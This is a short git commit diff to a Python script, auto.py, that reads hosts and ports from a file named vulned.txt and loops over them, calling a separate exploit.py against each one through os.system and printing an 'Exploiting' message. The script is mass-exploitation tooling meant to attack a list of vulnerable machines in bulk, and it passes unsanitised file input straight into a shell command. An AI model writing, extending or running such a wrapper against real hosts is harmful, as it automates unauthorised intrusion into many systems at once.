feb0e333d15b10b98719ea9d4dbf6d17e9ced6ca
win64 <77787761+win64@users.noreply.github.com>
2021-05-11 13:05:04 +0700

    Update auto.py

--- auto.py
+++ auto.py
@@ -1,4 +1,10 @@
+#code writed by https://github.com/weryfy
 import os
 handle=open("./vulned.txt","r")
+ip=''
+port=''
 for x in handle:
-	os.system('python3 ./exploit.py -ip %s -p %s'%(x.split(':')[0], x.split(':')[1]))
+        ip=x.split(':')[0]
+        port=x.split(':')[1]
+        print('[*]Exploiting %s:%s...'%(ip, port))
+        os.system('python3 ./exploit.py -ip %s -p %s'%(ip, port))
